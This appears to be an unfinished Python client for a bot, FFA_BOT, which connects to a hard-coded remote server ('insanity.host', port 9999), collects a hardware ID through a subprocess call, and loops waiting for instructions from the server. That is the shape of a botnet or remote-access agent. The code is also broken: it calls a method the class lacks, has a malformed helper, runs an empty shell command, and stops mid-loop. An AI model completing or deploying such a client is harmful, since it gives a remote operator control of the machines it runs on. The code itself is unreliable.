import subprocess, socket

_HOST_IPADDR = "insanity.host"
_HOST_PORT = 9999
_BUFF_SIZE = 1024

class FFA_BOT:
    APP_NAME:      str = ""
    SOCKET:        socket.socket = None
    LISTENING:     int = 0
    def __init__(self, aname: str):
        global _HOST_IPADDR
        global _HOST_PORT

        self.APP_NAME = aname

        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.SOCKET.connect((_HOST_IPADDR, _HOST_PORT))
        self.settimeout(0)

        self.__listen_to_server()

    def _gethwid() -> str:
        return subprocess.getoutput("")

    def __listen_to_server(self) -> None:
        global _BUFF_SIZE

        self.LISTENING = 1
        while self.LISTENING != 0:
            data = self.SOCKET.recv(_BUFF_SIZE)